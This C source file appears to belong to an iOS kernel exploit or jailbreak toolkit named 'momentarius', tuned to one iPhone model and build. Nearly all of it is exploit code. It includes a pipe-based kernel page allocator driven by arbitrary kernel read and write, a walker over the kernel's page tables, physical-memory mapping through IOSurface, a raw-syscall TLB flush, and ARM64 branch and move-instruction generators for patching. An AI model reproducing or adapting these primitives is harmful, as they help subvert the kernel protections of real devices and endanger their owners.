#include <sys/sysctl.h>
#include <IOKit/IOKitLib.h>
#include <dlfcn.h>
#include "utils.h"

extern uint32_t off_proc_p_fd;
extern uint32_t off_filedesc_fd_ofiles;

__attribute__((naked)) void momentarius_tlb_flush(void) {
    asm ("dsb sy");
    asm ("mov x0, xzr");
    asm ("mov x1, #0x3");
    asm ("mov x2, #80");
    asm ("mov x16, #-61");
    asm ("svc #0x80");
    asm ("mov x0, xzr");
    asm ("svc #0x80");
    asm ("dmb sy");
    asm ("ret");
}

__attribute__((naked)) static void mem_copy(void *dest, void *src, uint32_t size) {
    asm("mov x8, xzr");
    asm("0:");
    asm("cmp x2, x8");
    asm("beq 1f");
    asm("ldrb w9, [x1, x8]");
    asm("strb w9, [x0, x8]");
    asm("add x8, x8, #0x1");
    asm("b 0b");
    asm("1:");
    asm("ret");
}

uint64_t map_phys_data(uint64_t pa, uint32_t size) {
    if (pa == 0 || size > 0x10000) return 0;
    uint64_t page = trunc_page_kernel(pa);
    void *mapped = NULL;
    
    int result = IOSurface_map_withCacheMode(page, size, &mapped, 0);
    if (result != 0 || mapped == NULL) return 0;
    return (uint64_t)mapped;
}

uint64_t map_writeback_page(uint64_t pa) {
    if (pa == 0) return 0;
    uint64_t page = trunc_page_kernel(pa);
    void *mapped = NULL;
    
    int result = IOSurface_map_withCacheMode(page, 0x4000, &mapped, IO_MAP_INNER_WRITEBACK);
    if (result != 0 || mapped == NULL) return 0;
    return (uint64_t)mapped;
}

uint64_t map_physread64(uint64_t pa) {
    if (pa == 0) return 0;
    uint64_t page = trunc_page_kernel(pa);
    uint64_t offset = pa - page;
    
    uint64_t mapped = map_phys_data(page, 0x4000);
    if (mapped == 0) return 0;
    
    uint64_t value = 0;
    mem_copy(&value, (void *)(mapped + offset), 0x8);
    return value;
}

uint64_t kalloc_page(void) {
    int fds[2] = {-1, -1};
    if (pipe(fds) != 0) return 0;

    if (momentarius.allocator_fd_count >= MOMENTARIUS_MAX_ALLOCATOR_PIPES) {
        close(fds[0]);
        close(fds[1]);
        return 0;
    }

    uint64_t *temp = calloc(1, 0x4000);
    if (temp == NULL) {
        close(fds[0]);
        close(fds[1]);
        return 0;
    }

    ssize_t written = write(fds[1], temp, 0x4000);
    if (written != 0x4000) {
        free(temp);
        close(fds[0]);
        close(fds[1]);
        return 0;
    }

    ssize_t read_count = read(fds[0], temp, 0x4000);
    if (read_count != 0x4000) {
        free(temp);
        close(fds[0]);
        close(fds[1]);
        return 0;
    }
    free(temp);
    sync();
    
    if (momentarius.self_proc_addr == 0 || !KADDR_VALID(momentarius.self_proc_addr)) goto fail_pipe;
    // These offsets are exact-profile gated by Lara for iPhone12,1 / 20G75.
    uint64_t offset = off_proc_p_fd + off_filedesc_fd_ofiles;
    uint64_t fd_ofiles = kread_ptr(momentarius.self_proc_addr + offset);
    if (fd_ofiles == 0 || !KADDR_VALID(fd_ofiles)) goto fail_pipe;

    uint64_t fproc = kread_ptr(fd_ofiles + fds[0] * 0x8);
    if (fproc == 0 || !KADDR_VALID(fproc)) goto fail_pipe;

    uint64_t f_fglob = kread_ptr(fproc + 0x10);
    if (f_fglob == 0 || !KADDR_VALID(f_fglob)) goto fail_pipe;
    
    uint64_t fg_data = kread_ptr(f_fglob + 0x38);
    if (fg_data == 0 || !KADDR_VALID(fg_data)) goto fail_pipe;

    uint64_t pipe_buf = kread_ptr(fg_data + 0x10);
    if (pipe_buf == 0 || !KADDR_VALID(pipe_buf)) goto fail_pipe;

    uint8_t empty[32] = {0};
    kwritebuf(fg_data, empty, 32);
    uint32_t slot = momentarius.allocator_fd_count++;
    momentarius.allocator_fds[slot][0] = fds[0];
    momentarius.allocator_fds[slot][1] = fds[1];
    return pipe_buf;

fail_pipe:
    close(fds[0]);
    close(fds[1]);
    return 0;
}

uint32_t a64_gen_movk(uint8_t rd, int32_t imm, uint8_t sh) {
    return rd | 0xF2800000 | (0x20 * imm) | ((int)sh >> 4 << 0x15);
}

uint32_t a64_gen_movz(uint8_t rd, int32_t imm, uint8_t sh) {
    return rd | 0xD2800000 | (0x20 * imm) | ((int)sh >> 4 << 0x15);
}

int32_t a64_branch_difference(uint64_t from, uint64_t to) {
    return (from <= to) ? (int32_t)(to - from) : (int32_t)(-(from - to));
}

uint32_t a64_gen_cond_branch(uint64_t from, uint64_t to, uint8_t cond) {
    int32_t diff = a64_branch_difference(from, to);
    return (uint32_t)((((int64_t)diff / 4) << 5) | 0x54000000 | (cond & 0xf));
}

uint32_t a64_gen_branch(uint64_t from, uint64_t to) {
    int32_t diff = a64_branch_difference(from, to);
    return ((diff >> 2) & 0x3FFFFFF) | 0x14000000;
}

uint64_t gfx_phystokv(uint64_t pa) {
    if (pa == 0) return 0;
    uint64_t min = momentarius.kern_min_va;
    uint64_t max = momentarius.kern_max_va;
    uint64_t cpu_ttep_va = momentarius.kern_tte;
    uint64_t l1_mask = 0x7;
    uint64_t va = min;
    
    if (va < max) {
        uint64_t cached_l2_entry_va = 0;
        uint64_t l1_entry_va = 0;
        uint64_t cached_l3_table_va = 0;
        uint64_t l2_desc = 0;
        uint64_t l1_desc = 0;
        uint64_t next = 0;
        uint64_t next_aligned = 0;
        bool wrapped = false;
        
        uint64_t *l3_table = calloc(1, 0x4000);
        if (l3_table == NULL) return 0;
        
        while (1) {
            uint64_t l1_index = l1_mask & (va >> TT_L1_SHIFT);
            if (cpu_ttep_va + (l1_index * sizeof(uint64_t)) != l1_entry_va) {
                l1_entry_va = cpu_ttep_va + (l1_index * sizeof(uint64_t));
                if (KADDR_VALID(l1_entry_va)) l1_desc = kread64(l1_entry_va);
            }
            
            if ((l1_desc & 1) == 0) goto skip_64gb;
            uint64_t l2_table_va = phystokv(l1_desc & TTE_PA_MASK);
            
            if (l2_table_va == 0) goto skip_64gb;
            
            uint64_t l2_entry_va = l2_table_va + ((va >> 22) & 0x3FF8);
            if (cached_l2_entry_va != l2_entry_va) {
                cached_l2_entry_va = l2_entry_va;
                if (KADDR_VALID(l2_entry_va))  l2_desc = kread64(l2_entry_va);
            }
            
            if ((l2_desc & 1) == 0) goto skip_32mb;
            if ((l2_desc & 2) == 0 && (l2_desc & 0xFFFFFE000000ULL) == pa) {
                free(l3_table);
                return va;
            }
            
            uint64_t l3_table_va = phystokv(l2_desc & TTE_PA_MASK);
            if (!l3_table_va) goto skip_32mb;
            
            if (cached_l3_table_va != l3_table_va && KADDR_VALID(l3_table_va)) {
                cached_l3_table_va = l3_table_va;
                kreadbuf(l3_table_va, l3_table, 0x4000);
            }
            
            if ((l3_table[(va >> TT_L3_SHIFT) & 0x7FF] & TTE_PA_MASK) == pa) {
                free(l3_table);
                return va | 0xFFFFF00000000000ULL;
            }
            
            va += 0x4000;
            goto bounds;
            
        skip_32mb:
            next = va + TT_L2_SIZE;
            next_aligned = next & 0xFFFFFFFFFE000000ULL;
            wrapped = (next_aligned == 0);
            goto set_min;
            
        skip_64gb:
            next = va + TT_L1_SIZE;
            next_aligned = next & 0xFFFFFFF000000000ULL;
            wrapped = (next_aligned == 0);
            
        set_min:
            va = wrapped ? next : next_aligned;
            
        bounds:
            if (va >= max) {
                if (va - 1 == max) return 0;
                free(l3_table);
                return va;
            }
        }
    }
    return va;
}

void gfx_suspend(void) {
    if (!MACH_PORT_VALID(momentarius.iomfb_client)) return;
    uint64_t state = 0;
    uint64_t output[1] = {0};
    uint32_t count = 1;
    
    IOConnectCallScalarMethod(momentarius.iomfb_client, IOMFB_POWER_CHANGE, &state, 1, NULL, NULL);
    IOConnectCallScalarMethod(momentarius.iomfb_client, IOMFB_START_SWAP, NULL, 0, output, &count);
    usleep(0);
}

void gfx_resume(void) {
    if (!MACH_PORT_VALID(momentarius.iomfb_client)) return;
    uint64_t state = 2;
    uint64_t invert_on = 1;
    uint64_t invert_off = 0;
    uint64_t input[2] = {1, 1};

    IOConnectCallScalarMethod(momentarius.iomfb_client, IOMFB_POWER_CHANGE, &state, 1, NULL, NULL);
    IOConnectCallScalarMethod(momentarius.iomfb_client, IOMFB_COLOR_INVERT, &invert_on, 1, NULL, NULL);
    IOConnectCallScalarMethod(momentarius.iomfb_client, IOMFB_CANCEL_SWAP, input, 2, NULL, NULL);
    IOConnectCallScalarMethod(momentarius.iomfb_client, IOMFB_COLOR_INVERT, &invert_off, 1, NULL, NULL);
    usleep(0);
}
